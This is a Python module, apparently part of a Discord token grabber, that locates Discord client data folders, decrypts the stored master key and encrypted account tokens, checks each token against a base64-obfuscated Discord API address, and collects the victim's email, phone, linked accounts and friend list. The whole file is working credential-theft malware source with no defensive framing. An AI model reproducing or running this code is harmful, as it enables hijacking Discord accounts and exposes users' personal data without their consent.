from helpers.helpers import HelpersSilentScript

import os
from json import loads
from base64 import b64decode
import re
from urllib.request import Request, urlopen
from Crypto.Cipher import AES

class DiscordToken:
    def __init__(self):
        self.roaming = os.getenv('APPDATA')
        self.Tokens = []
        self.Profile = []
        self.main()
    
    def main(self):
        discordPaths = [
            [f"{self.roaming}/Discord", "/Local Storage/leveldb"],
            [f"{self.roaming}/Lightcord", "/Local Storage/leveldb"],
            [f"{self.roaming}/discordcanary", "/Local Storage/leveldb"],
            [f"{self.roaming}/discordptb", "/Local Storage/leveldb"],
        ]
        
        for patt in discordPaths:
            self.GetDiscord(patt[0], patt[1])
        
        return {
            'token': self.Tokens,
            'profile': self.Profile
        }   
                    
    def GetDiscord(self, path, arg):
        if not os.path.exists(f"{path}/Local State"): return
        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        helper = HelpersSilentScript()
        master_key = helper.CryptUnprotectData(master_key[5:])
        pathC = path + arg
        
        for file in os.listdir(pathC):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokenDecoded = self.DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if self.checkToken(tokenDecoded):
                            if not tokenDecoded in self.Tokens:
                                self.Tokens.append(tokenDecoded)

    def DecryptValue(self, buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

    def checkToken(self, token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        
        try:
            response = urlopen(Request(b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1l').decode('utf-8'), headers=headers))
            data = response.read().decode('utf-8') 
            self.getDataProfileDiscord(data)
            return True
        except:
            return False
    
    def getDataProfileDiscord(self, json): 
        json = loads(json)
        if json['id'] in self.Profile:
            return 
        self.Profile.append(json['id'])
        self.Profile.append(json['username'])
        self.Profile.append(json['avatar'])
        self.Profile.append(json['global_name'])
        self.Profile.append(json['locale'])
        self.Profile.append(json['email'])
        self.Profile.append(json['verified'])
        self.Profile.append(json['phone'])
        self.Profile.append(json['linked_users'])
        return self.Profile   
    
    
    def getfriends(self, token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        
        try:
            # Request(b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1l').decode('utf-8'))
            
            friendlist = loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships', headers=headers)).read().decode())
        except:
            return False
        
        # for friend in friendlist:
        #     print(friend['user']['username'] + '#' + friend['user']['discriminator'] + ' | ' + friend['user']['id'])